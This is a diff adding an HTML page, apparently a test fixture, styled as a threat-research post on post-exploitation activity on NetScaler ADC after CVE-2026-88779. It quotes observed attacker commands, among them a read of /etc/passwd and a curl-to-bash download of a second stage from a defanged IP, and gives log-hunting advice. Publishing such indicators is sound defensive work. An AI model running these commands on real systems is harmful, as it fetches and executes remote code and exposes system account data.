@@ -1,0 +1,14 @@
+<!doctype html><html><head><title>NetScaler post-exploitation</title>
+<meta property="og:site_name" content="Vendor Fixture Research">
+<meta property="article:published_time" content="2026-10-20T09:00:00Z"></head>
+<body><nav>Home | Blog</nav><article>
+<h1>Post-exploitation activity on NetScaler ADC (CVE-2026-88779)</h1>
+<p>Following exploitation, we observed the NetScaler packet-processing web process <code>nsppe</code> spawning an interactive shell. Within two minutes the actor ran a burst of discovery commands and then downloaded a second stage with curl.</p>
+<pre>/bin/sh -c whoami
+/bin/sh -c id
+/bin/sh -c uname -a
+/bin/sh -c cat /etc/passwd
+/bin/sh -c curl -s hxxp://45[.]61[.]139[.]12/x.sh | bash</pre>
+<p>The second stage reached out to update-check[.]net. We recommend hunting appliance shell logs (/var/log/bash.log, /var/log/notice.log) for commands executed by nobody as children of nsppe.</p>
+<p>No file hashes were recovered.</p>
+</article><footer>© fixture</footer></body></html>
